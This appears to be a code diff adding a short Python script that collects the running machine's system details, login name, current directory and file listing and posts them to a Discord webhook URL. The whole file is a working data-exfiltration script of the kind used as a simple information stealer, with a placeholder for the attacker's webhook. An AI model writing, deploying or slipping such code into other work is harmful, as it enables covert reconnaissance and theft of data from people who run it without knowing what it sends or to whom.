@@ -1,0 +1,38 @@
+import os
+import platform
+import subprocess
+import requests
+
+# Get system information
+def get_system_info():
+    uname = platform.uname()
+    return f"System: {uname.system}\nNode Name: {uname.node}\nRelease: {uname.release}\nVersion: {uname.version}\nMachine: {uname.machine}\nProcessor: {uname.processor}"
+
+# Get user information
+def get_user_info():
+    username = os.getlogin()
+    cwd = os.getcwd()
+    files = os.listdir(cwd)
+    return f"Username: {username}\nCurrent Directory: {cwd}\nFiles: {files}"
+
+# Send data to Discord webhook
+def send_to_webhook(url, data):
+    requests.post(url, data={"content": data})
+
+# Main function
+def main():
+    # Enter your Discord webhook URL here
+    webhook_url = "YOUR_WEBHOOK_URL"
+
+    # Get system and user information
+    system_info = get_system_info()
+    user_info = get_user_info()
+
+    # Combine system and user information
+    data = f"{system_info}\n\n{user_info}"
+
+    # Send data to Discord webhook
+    send_to_webhook(webhook_url, data)
+
+if __name__ == "__main__":
+    main()
